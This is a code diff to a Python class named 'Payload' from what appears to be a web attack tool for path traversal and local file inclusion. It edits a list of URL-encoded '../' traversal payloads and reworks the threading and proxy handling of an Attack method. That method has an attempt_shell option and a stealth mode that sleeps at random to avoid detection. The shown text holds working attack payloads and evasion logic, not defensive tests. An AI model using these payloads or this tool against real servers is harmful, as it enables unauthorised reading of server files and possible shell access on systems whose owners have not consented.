@@ -27,7 +27,7 @@ class Payload:
 		self.creds = creds
 		self.batch = batch
 		self.stealth = stealth
-		self.linux_dirTraversal = ["", "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
+		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
 
@@ -95,14 +95,15 @@ class Payload:
 		return payloads
 
 
+	# TO DO Threading doesn't work
 	# Added thread support for the attacks which speeds things up significantly!
 	def Attack(self, attempt_shell=False, mode=0, force=False):
 		if not force and not self.urlCheck():
 			return
+		
 		dirThread = threading.Thread(target=self.dirTraversalCheck, args=[])
 		dirThread.start()
-		headerres = threading.Thread(target=self.headerCheck, args=[])
-		headerres.start()
+		headerres = self.headerCheck() # if I put threading in this function it breaks!
 		filterThread = threading.Thread(target=self.filterCheck, args=[])
 		filterThread.start()
 		cookieres = threading.Thread(target=self.cookieCheck, args=[])
@@ -151,8 +152,7 @@ class Payload:
 		if self.stealth:
 			time.sleep(random.randint(2,6)) # Sleep for a random interval of seconds (between 2 and 6) per request to be more stealthy
 		if self.proxies:
-			proxy_support = threading.Thread(target=urllib.request.ProxyHandler, args=[fetch_proxy()])
-			proxy_support.start()
+			proxy_support = urllib.request.ProxyHandler(fetch_proxy())
 			opener = urllib.request.build_opener(proxy_support)
 			urllib.request.install_opener(opener)
 		try:
@@ -348,8 +348,6 @@ class Payload:
 						return ret
 					# Otherwise hit Nginx Files and return the results no matter what they are
 					return self.hitNginx()
-				else:
-					os._exit(0)
 
 		# checks the type of the server
 		if "apache" in response.headers['Server'].lower():
